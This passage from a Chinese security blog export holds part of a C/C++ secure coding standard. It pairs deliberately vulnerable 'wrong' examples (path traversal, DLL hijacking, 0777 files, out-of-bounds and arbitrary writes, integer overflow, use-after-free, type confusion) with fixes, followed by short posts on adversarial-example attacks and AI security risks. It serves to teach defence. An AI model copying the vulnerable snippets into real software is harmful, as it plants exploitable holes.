【必须】自己实现的rand范围不应过小</h4><p>如果在弱安全场景相关的算法中自己实现了PRNG，请确保rand出来的随机数不会很小或可预测。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Badint32_t val = ((state[0] * 1103515245U) + 12345U) &amp; 999999;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上述例子可能想生成0~999999共100万种可能的随机数，但是999999的二进制是11110100001000111111，与&amp;运算后，0位一直是0，所以生成出的范围明显会小于100万种。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">// Goodint32_t val = ((state[0] * 1103515245U) + 12345U) % 1000000;// Goodint32_t val = ((state[0] * 1103515245U) + 12345U) &amp; 0x7fffffff;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-逻辑漏洞</code></p><p><a id="1.5"></a></p><h3 id="5-文件操作"><a href="#5-文件操作" class="headerlink" title="5    文件操作"></a>5    文件操作</h3><p><a id="1.5.1"></a></p><h4 id="5-1-【必须】避免路径穿越问题"><a href="#5-1-【必须】避免路径穿越问题" class="headerlink" title="5.1  【必须】避免路径穿越问题"></a>5.1  【必须】避免路径穿越问题</h4><p>在进行文件操作时，需要判断外部传入的文件名是否合法，如果文件名中包含 <code>../</code> 等特殊字符，则会造成路径穿越，导致任意文件的读写。</p><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Foo() {  char file_path[PATH_MAX] = "/home/user/code/";  // 如果传入的文件名包含../可导致路径穿越  // 例如"../file.txt"，则可以读取到上层目录的file.txt文件  char name[20] = "../file.txt";  memcpy(file_path + strlen(file_path), name, sizeof(name));  int fd = open(file_path, O_RDONLY);  if (fd != -1) {    char data[100] = {0};    int num = 0;    memset(data, 0, sizeof(data));    num = read(fd, data, sizeof(data));    if (num &gt; 0) {      write(STDOUT_FILENO, data, num);    }    close(fd);  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Foo() {  char file_path[PATH_MAX] = "/home/user/code/";  char name[20] = "../file.txt";  // 判断传入的文件名是否非法，例如"../file.txt"中包含非法字符../，直接返回  if (strstr(name, "..") != NULL){    // 包含非法字符    return;  }  memcpy(file_path + strlen(file_path), name, sizeof(name));  int fd = open(file_path, O_RDONLY);  if (fd != -1) {    char data[100] = {0};    int num = 0;    memset(data, 0, sizeof(data));    num = read(fd, data, sizeof(data));    if (num &gt; 0) {      write(STDOUT_FILENO, data, num);    }    close(fd);   }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-逻辑漏洞</code>  </p><p><a id="1.5.2"></a></p><h4 id="5-2-【必须】避免相对路径导致的安全问题（DLL、EXE劫持等问题）"><a href="#5-2-【必须】避免相对路径导致的安全问题（DLL、EXE劫持等问题）" class="headerlink" title="5.2  【必须】避免相对路径导致的安全问题（DLL、EXE劫持等问题）"></a>5.2  【必须】避免相对路径导致的安全问题（DLL、EXE劫持等问题）</h4><p>在程序中，使用相对路径可能导致一些安全风险，例如DLL、EXE劫持等问题。</p><p>例如以下代码，可能存在劫持问题：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int Foo() {  // 传入的是dll文件名，如果当前目录下被写入了恶意的同名dll，则可能导致dll劫持  HINSTANCE hinst = ::LoadLibrary("dll_nolib.dll");  if (hinst != NULL) {    cout&lt;&lt;"dll loaded!" &lt;&lt; endl;  }  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>针对DLL劫持的安全编码的规范：</p><p>   1）调用LoadLibrary，LoadLibraryEx，CreateProcess，ShellExecute等进行模块加载的函数时，指明模块的完整（全）路径，禁止使用相对路径，这样就可避免从其它目录加载DLL。<br>   2）在应用程序的开头调用SetDllDirectory(TEXT(“”)); 从而将当前目录从DLL的搜索列表中删除。结合SetDefaultDllDirectories，AddDllDirectory，RemoveDllDirectory这几个API配合使用，可以有效的规避DLL劫持问题。这些API只能在打了KB2533623补丁的Windows7，2008上使用。</p><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.5.3"></a></p><h4 id="5-3-【必须】文件权限控制"><a href="#5-3-【必须】文件权限控制" class="headerlink" title="5.3  【必须】文件权限控制"></a>5.3  【必须】文件权限控制</h4><p>在创建文件时，需要根据文件的敏感级别设置不同的访问权限，以防止敏感数据被其他恶意程序读取或写入。</p><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int Foo() {  // 不要设置为777权限，以防止被其他恶意程序操作  if (creat("file.txt", 0777) &lt; 0) {    printf("文件创建失败！\n");  } else {    printf("文件创建成功！\n");  }  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p> <code>中风险-逻辑漏洞</code>  </p><p><a id="1.6"></a></p><h3 id="6-内存操作"><a href="#6-内存操作" class="headerlink" title="6 内存操作"></a>6 内存操作</h3><p><a id="1.6.1"></a></p><h4 id="6-1-【必须】防止各种越界写（向前-向后）"><a href="#6-1-【必须】防止各种越界写（向前-向后）" class="headerlink" title="6.1 【必须】防止各种越界写（向前/向后）"></a>6.1 【必须】防止各种越界写（向前/向后）</h4><p>错误1：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int a[5];a[5] = 0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>错误2：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int a[5];int b = user_controlled_value;a[b] = 3;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.6.2"></a></p><h4 id="6-2-【必须】防止任意地址写"><a href="#6-2-【必须】防止任意地址写" class="headerlink" title="6.2 【必须】防止任意地址写"></a>6.2 【必须】防止任意地址写</h4><p>任意地址写会导致严重的安全隐患，可能导致代码执行。因此，在编码时必须校验写入的地址。</p><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Write(MyStruct dst_struct) {  char payload[10] = { 0 };  memcpy(dst_struct.buf, payload, sizeof(payload));}int main() {  MyStruct dst_stuct;  dst_stuct.buf = (char*)user_controlled_value;  Write(dst_stuct);  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.7"></a></p><h3 id="7-数字操作"><a href="#7-数字操作" class="headerlink" title="7 数字操作"></a>7 数字操作</h3><p><a id="1.7.1"></a></p><h4 id="7-1-【必须】防止整数溢出"><a href="#7-1-【必须】防止整数溢出" class="headerlink" title="7.1 【必须】防止整数溢出"></a>7.1 【必须】防止整数溢出</h4><p>在计算时需要考虑整数溢出的可能，尤其在进行内存操作时，需要对分配、拷贝等大小进行合法校验，防止整数溢出导致的漏洞。</p><p>错误（该例子在计算时产生整数溢出）</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">const int kMicLen = 4;// 整数溢出void Foo() {  int len = 1;  char payload[10] = { 0 };  char dst[10] = { 0 };  // Bad, 由于len小于4，导致计算拷贝长度时，整数溢出  // len - kMicLen == 0xfffffffd  memcpy(dst, payload, len - kMicLen);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确例子</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Foo() {  int len = 1;  char payload[10] = { 0 };  char dst[10] = { 0 };  int size = len - kMicLen;  // 拷贝前对长度进行判断  if (size &gt; 0 &amp;&amp; size &lt; 10) {    memcpy(dst, payload, size);    printf("memcpy good\n");  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.7.2"></a></p><h4 id="7-2-【必须】防止Off-By-One"><a href="#7-2-【必须】防止Off-By-One" class="headerlink" title="7.2 【必须】防止Off-By-One"></a>7.2 【必须】防止Off-By-One</h4><p>在进行计算或者操作时，如果使用的最大值或最小值不正确，使得该值比正确值多1或少1，可能导致安全风险。</p><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">char firstname[20];char lastname[20];char fullname[40];fullname[0] = '\0';strncat(fullname, firstname, 20);// 第二次调用strncat()可能会追加另外20个字符。如果这20个字符没有终止空字符，则存在安全问题strncat(fullname, lastname, 20);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">char firstname[20];char lastname[20];char fullname[40];fullname[0] = '\0';// 当使用像strncat()函数时，必须在缓冲区的末尾为终止空字符留下一个空字节，避免off-by-onestrncat(fullname, firstname, sizeof(fullname) - strlen(fullname) - 1);strncat(fullname, lastname, sizeof(fullname) - strlen(fullname) - 1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于 C++ 代码，再次强烈建议使用 <code>string</code>、<code>vector</code> 等组件代替原始指针和数组操作。</p><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.7.3"></a></p><h4 id="7-3-【必须】避免大小端错误"><a href="#7-3-【必须】避免大小端错误" class="headerlink" title="7.3 【必须】避免大小端错误"></a>7.3 【必须】避免大小端错误</h4><p>在一些涉及大小端数据处理的场景，需要进行大小端判断，例如从大端设备取出的值，要以大端进行处理，避免端序错误使用。</p><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.7.4"></a></p><h4 id="7-4-【必须】检查除以零异常"><a href="#7-4-【必须】检查除以零异常" class="headerlink" title="7.4 【必须】检查除以零异常"></a>7.4 【必须】检查除以零异常</h4><p>在进行除法运算时，需要判断被除数是否为零，以防导致程序不符合预期或者崩溃。</p><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int divide(int x, int y) {  return x / y;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>正确：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int divide(int x, int y) {  if (y == 0) {    throw DivideByZero;  }  return x / y;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>低风险-拒绝服务</code></p><p><a id="1.7.5"></a></p><h4 id="7-5-【必须】防止数字类型的错误强转"><a href="#7-5-【必须】防止数字类型的错误强转" class="headerlink" title="7.5 【必须】防止数字类型的错误强转"></a>7.5 【必须】防止数字类型的错误强转</h4><p>在有符号和无符号数字参与的运算中，需要注意类型强转可能导致的逻辑错误，建议指定参与计算时数字的类型或者统一类型参与计算。</p><p>错误例子</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int Foo() {  int len = 1;  unsigned int size = 9;  // 1 &lt; 9 - 10 ? 由于运算中无符号和有符号混用，导致计算结果以无符号计算  if (len &lt; size - 10) {    printf("Bad\n");  } else {    printf("Good\n");  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确例子</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Foo() {  // 统一两者计算类型为有符号  int len = 1;  int size = 9;  if (len &lt; size - 10) {    printf("Bad\n");  } else {    printf("Good\n");  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.7.6"></a></p><h4 id="7-6-【必须】比较数据大小时加上最小-最大值的校验"><a href="#7-6-【必须】比较数据大小时加上最小-最大值的校验" class="headerlink" title="7.6 【必须】比较数据大小时加上最小/最大值的校验"></a>7.6 【必须】比较数据大小时加上最小/最大值的校验</h4><p>在进行数据大小比较时，要合理地校验数据的区间范围，建议根据数字类型，对其进行最大和最小值的判断，以防止非预期错误。</p><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Foo(int index) {  int a[30] = {0};  // 此处index是int型，只考虑了index小于数组大小，但是并未判断是否大于等于0  if (index &lt; 30) {    // 如果index为负数，则越界    a[index] = 1;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Foo(int index) {  int a[30] = {0};  // 判断index的最大最小值  if (index &gt;= 0 &amp;&amp; index &lt; 30) {    a[index] = 1;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.8"></a></p><h3 id="8-指针操作"><a href="#8-指针操作" class="headerlink" title="8    指针操作"></a>8    指针操作</h3><p><a id="1.8.1"></a></p><h4 id="8-1-【建议】检查在pointer上使用sizeof"><a href="#8-1-【建议】检查在pointer上使用sizeof" class="headerlink" title="8.1 【建议】检查在pointer上使用sizeof"></a>8.1 【建议】检查在pointer上使用sizeof</h4><p>除了测试当前指针长度，否则一般不会在pointer上使用sizeof。</p><p>正确：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">size_t pointer_length = sizeof(void*);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可能错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">size_t structure_length = sizeof(Foo*);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可能是：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">size_t structure_length = sizeof(Foo);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.8.2"></a></p><h4 id="8-2-【必须】检查直接将数组和0比较的代码"><a href="#8-2-【必须】检查直接将数组和0比较的代码" class="headerlink" title="8.2 【必须】检查直接将数组和0比较的代码"></a>8.2 【必须】检查直接将数组和0比较的代码</h4><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int a[3];...;if (a &gt; 0)  ...;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该判断永远为真，等价于:</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int a[3];...;if (&amp;a[0])  ...;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可能是：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int a[3];...;if(a[0] &gt; 0)  ...;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启足够的编译器警告（GCC 中为 <code>-Waddress</code>，并已包含在 <code>-Wall</code> 中），并设置为错误，可以在编译期间发现该问题。</p><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.8.3"></a></p><h4 id="8-3-【必须】不应当向指针赋予写死的地址"><a href="#8-3-【必须】不应当向指针赋予写死的地址" class="headerlink" title="8.3 【必须】不应当向指针赋予写死的地址"></a>8.3 【必须】不应当向指针赋予写死的地址</h4><p>特殊情况需要特殊对待（比如开发硬件固件时可能需要写死）</p><p>但是如果是系统驱动开发之类的，写死可能会导致后续的问题。</p><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.8.4"></a></p><h4 id="8-4-【必须】检查空指针"><a href="#8-4-【必须】检查空指针" class="headerlink" title="8.4 【必须】检查空指针"></a>8.4 【必须】检查空指针</h4><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">*foo = 100;if (!foo) {  ERROR("foobar");}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (!foo) {  ERROR("foobar");}*foo = 100;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Foo(char* bar) {  *bar = '\0';}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>正确：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Foo(char* bar) {  if(bar)    *bar = '\0';  else    ...;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>低风险-拒绝服务</code></p><p><a id="1.8.5"></a></p><h4 id="8-5-【必须】释放完后置空指针"><a href="#8-5-【必须】释放完后置空指针" class="headerlink" title="8.5 【必须】释放完后置空指针"></a>8.5 【必须】释放完后置空指针</h4><p>在对指针进行释放后，需要将该指针设置为NULL，以防止后续free指针的误用，导致UAF等其他内存破坏问题。尤其是在结构体、类里面存储的原始指针。</p><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void foo() {  char* p = (char*)malloc(100);  memcpy(p, "hello", 6);  printf("%s\n", p);  free(p); // 此时p所指向的内存已被释放，但是p所指的地址仍然不变  // 未设置为NULL，可能导致UAF等内存错误  if (p != NULL) {  // 没有起到防错作用    printf("%s\n", p); // 错误使用已经释放的内存  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void foo() {  char* p = (char*)malloc(100);  memcpy(p, "hello", 6);  // 此时p所指向的内存已被释放，但是p所指的地址仍然不变  printf("%s\n", p);  free(p);  //释放后将指针赋值为空  p = NULL;  if (p != NULL)  { // 没有起到防错作用    printf("%s\n", p); // 错误使用已经释放的内存  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于 C++ 代码，使用 string、vector、智能指针等代替原始内存管理机制，可以大量减少这类错误。</p><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.8.6"></a></p><h4 id="8-6-【必须】防止错误的类型转换（type-confusion）"><a href="#8-6-【必须】防止错误的类型转换（type-confusion）" class="headerlink" title="8.6 【必须】防止错误的类型转换（type confusion）"></a>8.6 【必须】防止错误的类型转换（type confusion）</h4><p>在对指针、对象或变量进行操作时，需要能够正确判断所操作对象的原始类型。如果使用了与原始类型不兼容的类型进行访问，则存在安全隐患。</p><p>错误：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">const int NAME_TYPE = 1;const int ID_TYPE = 2;// 该类型根据 msg_type 进行区分，如果在对MessageBuffer进行操作时没有判断目标对象，则存在类型混淆struct MessageBuffer {  int msg_type;  union {    const char *name;    int name_id;  };};void Foo() {  struct MessageBuffer buf;  const char* default_message = "Hello World";  // 设置该消息类型为 NAME_TYPE，因此buf预期的类型为 msg_type + name  buf.msg_type = NAME_TYPE;  buf.name = default_message;  printf("Pointer of buf.name is %p\n", buf.name);  // 没有判断目标消息类型是否为ID_TYPE，直接修改nameID，导致类型混淆  buf.name_id = user_controlled_value;  if (buf.msg_type == NAME_TYPE) {    printf("Pointer of buf.name is now %p\n", buf.name);    // 以NAME_TYPE作为类型操作，可能导致非法内存读写    printf("Message: %s\n", buf.name);  } else {    printf("Message: Use ID %d\n", buf.name_id);  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确（判断操作的目标是否是预期类型）：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Foo() {  struct MessageBuffer buf;  const char* default_message = "Hello World";  // 设置该消息类型为 NAME_TYPE，因此buf预期的类型为 msg_type + name  buf.msg_type = NAME_TYPE;  buf.name = default_msessage;  printf("Pointer of buf.name is %p\n", buf.name);  // 判断目标消息类型是否为 ID_TYPE，不是预期类型则做对应操作  if (buf.msg_type == ID_TYPE)    buf.name_id = user_controlled_value;  if (buf.msg_type == NAME_TYPE) {    printf("Pointer of buf.name is now %p\n", buf.name);    printf("Message: %s\n", buf.name);  } else {    printf("Message: Use ID %d\n", buf.name_id);  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.8.7"></a></p><h4 id="8-7-【必须】智能指针使用安全"><a href="#8-7-【必须】智能指针使用安全" class="headerlink" title="8.7 【必须】智能指针使用安全"></a>8.7 【必须】智能指针使用安全</h4><p>在使用智能指针时，防止其和原始指针的混用，否则可能导致对象生命周期问题，例如 UAF 等安全风险。</p><p>错误例子：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">class Foo { public:  explicit Foo(int num) { data_ = num; };  void Function() { printf("Obj is %p, data = %d\n", this, data_); }; private:  int data_;};std::unique_ptr&lt;Foo&gt; fool_u_ptr = nullptr;Foo* pfool_raw_ptr = nullptr;void Risk() {  fool_u_ptr = make_unique&lt;Foo&gt;(1);  // 从独占智能指针中获取原始指针,&lt;Foo&gt;(1)  pfool_raw_ptr = fool_u_ptr.get();  // 调用&lt;Foo&gt;(1)的函数  pfool_raw_ptr-&gt;Function();  // 独占智能指针重新赋值后会释放内存  fool_u_ptr = make_unique&lt;Foo&gt;(2);  // 通过原始指针操作会导致UAF，pfool_raw_ptr指向的对象已经释放  pfool_raw_ptr-&gt;Function();}// 输出：// Obj is 0000027943087B80, data = 1// Obj is 0000027943087B80, data = -572662307<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正确，通过智能指针操作:</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void Safe() {  fool_u_ptr = make_unique&lt;Foo&gt;(1);  // 调用&lt;Foo&gt;(1)的函数  fool_u_ptr-&gt;Function();  fool_u_ptr = make_unique&lt;Foo&gt;(2);  // 调用&lt;Foo&gt;(2)的函数  fool_u_ptr-&gt;Function();}// 输出：// Obj is 000002C7BB550830, data = 1// Obj is 000002C7BB557AF0, data = 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 代码安全与审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI安全之对抗样本攻击</title>
      <link href="/2021/11/14/ai-an-quan/ai-an-quan-zhi-dui-kang-yang-ben-gong-ji/"/>
      <url>/2021/11/14/ai-an-quan/ai-an-quan-zhi-dui-kang-yang-ben-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="AI安全之对抗样本攻击"><a href="#AI安全之对抗样本攻击" class="headerlink" title="AI安全之对抗样本攻击"></a>AI安全之对抗样本攻击</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>对抗样本，就是对输入数据进行略微修改，以使得机器学习算法对该输入给出错误的分类结果。在很多情况下，这些修改非常细微，人类观察者甚至根本不会注意到这些修改，但是分类器却会因此犯错误。对抗样本攻击对目前的机器学习系统提出了挑战，因为即使攻击者无法访问基础模型，也能对机器学习系统发起攻击。</p><p><img src="/2021/11/14/ai-an-quan/ai-an-quan-zhi-dui-kang-yang-ben-gong-ji/1.jpg" alt="原图像与对抗样本图像"></p><h2 id="ADVBOX对抗样本工具箱"><a href="#ADVBOX对抗样本工具箱" class="headerlink" title="ADVBOX对抗样本工具箱"></a>ADVBOX对抗样本工具箱</h2><p>下载地址：<a href="https://github.com/advboxes/ADVBOX">https://github.com/advboxes/ADVBOX</a></p><p>该工具支持多种攻击方法，包括白盒、黑盒</p><p>可以用来生成对抗样本</p><h3 id="白盒攻击（White-box-attack-methods）"><a href="#白盒攻击（White-box-attack-methods）" class="headerlink" title="白盒攻击（White-box attack methods）"></a>白盒攻击（White-box attack methods）</h3><ul><li>L-BFGS</li><li>FOSM </li><li>BIM</li><li>ILCM</li><li>MI-FGSM</li><li>JSMA</li><li>DeepFool</li><li>C/W</li></ul><h3 id="黑盒攻击（Black-box-attack-methods）"><a href="#黑盒攻击（Black-box-attack-methods）" class="headerlink" title="黑盒攻击（Black-box attack methods）"></a>黑盒攻击（Black-box attack methods）</h3><ul><li>Single Pixel Attack</li><li>Local Search Attack</li></ul><h3 id="防御方法（Defense-methods）"><a href="#防御方法（Defense-methods）" class="headerlink" title="防御方法（Defense methods）"></a>防御方法（Defense methods）</h3><ul><li>Feature Squeezing</li><li>Spatial Smoothing</li><li>Lable Smoothing</li><li>Gaussian Augmentation</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> AI安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI安全面临的风险与挑战</title>
      <link href="/2021/11/14/ai-an-quan/ai-an-quan-mian-lin-de-feng-xian-yu-tiao-zhan/"/>
      <url>/2021/11/14/ai-an-quan/ai-an-quan-mian-lin-de-feng-xian-yu-tiao-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="（一）人工智能安全挑战"><a href="#（一）人工智能安全挑战" class="headerlink" title="（一）人工智能安全挑战"></a>（一）人工智能安全挑战</h1><h2 id="人工智能“基础化”加速，基础设施面临安全挑战"><a href="#人工智能“基础化”加速，基础设施面临安全挑战" class="headerlink" title="人工智能“基础化”加速，基础设施面临安全挑战"></a>人工智能“基础化”加速，基础设施面临安全挑战</h2><p>2020 年 5 月，我国《政府工作报告》提出以  5G、人工智能等为代表的新型基础设施建设政策，此举按下了人工智能国家战略推进的快进键。随后，25 省市发布“新基建”政策方案，累计投资 30  余万亿人民币，加快推动人工智能算力、算法和数据基础设施建设。在新基建推动催化下，人工智能技术将加快转变为像水、电一样的基础设施，向社会全行业全领域赋能。</p><p>然而，人工智能基础设施却潜藏安全风险。以<strong>机器学习开源框架平台</strong>和<strong>预训练模型库</strong>为代表的算法基础设施因<strong>开发者蓄意破坏</strong>或<strong>代码实现不完善</strong>面临<strong>算法后门嵌入</strong>、<strong>代码安全漏洞</strong>等风险。2020 年 9 月，安全厂商 360 公开披露谷歌开源框架平台TensorFlow 存在 24 个安全漏洞。开源数据集以提供数据采集、清洗、标注等服务的人工智能基础数据设施面临训练<strong>数据不均衡</strong>、训练<strong>数据投毒</strong>、训练<strong>数据泄露</strong>等安全风险。2020 年，美国麻省理工学院的研究人员通过实验证实 CIFAR-100-LT、ImageNet-LT、SVHN-LT 等广泛应用的数据集存在严重不均衡问题。</p><h2 id="人工智能”协同性“增强，设计研发安全风险突出"><a href="#人工智能”协同性“增强，设计研发安全风险突出" class="headerlink" title="人工智能”协同性“增强，设计研发安全风险突出"></a>人工智能”协同性“增强，设计研发安全风险突出</h2><p>联邦学习、迁移学习等人工智能新技术的应用，促进跨机构间人工智能研发协作进一步增多。因遵循了不同目标和规范，使得人工智能设计研发阶段的安全风险更加复杂且难以检测发现。</p><p>一是<strong>人工智能算法自身存在技术脆弱性</strong>。当前，人工智能尚处于依托海量数据驱动知识学习的阶段，以深度神经网络为代表的人工智能算法仍存在弱鲁棒性、不可解释性、偏见歧视等尚未克服的技术局限。</p><p>二是<strong>人工智能新型安全攻击不断涌现</strong>。近年来，<strong>对抗样本攻击</strong>、<strong>算法后门攻击</strong>、<strong>模型窃取攻击</strong>、<strong>模型反馈误导</strong>、<strong>数据逆向还原</strong>、<strong>成员推理攻击</strong>等破坏人工智能算法和数据机密性、完整性、可用性的新型安全攻击快速涌现，人工智能安全性获得全球学术界和工业界广泛关注。三是算法设计实施有误产生非预期结果。人工智能算法的设计和实施有可能无法实现设计者的预设目标，导致产生偏离预期的不可控行为。</p><h2 id="人工智能“内嵌化”加深，应用失控风险危害显著"><a href="#人工智能“内嵌化”加深，应用失控风险危害显著" class="headerlink" 